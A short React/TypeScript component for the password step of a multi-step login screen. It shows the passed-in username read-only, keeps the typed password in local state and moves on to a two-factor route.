import { useState, useEffect } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import "./Password.css";

export const Password = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  useEffect(() => {
    // Récupérer l'username depuis l'état de navigation
    const state = location.state as { username?: string };
    if (state?.username) {
      setUsername(state.username);
    }
  }, [location]);

  const handleLogin = () => {
    navigate("/twofa", { state: { username } });
  };

  return (
    <div className="password-page">
      <div className="password-container">
        <input
          type="text"
          placeholder="Phone, email, or username"
          value={username}
          readOnly
          className="password-input"
        />
        <input
          type="password"
          placeholder="Password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          className="password-input"
        />
        <button className="login-button" onClick={handleLogin}>
          Log in
        </button>
      </div>
    </div>
  );
};
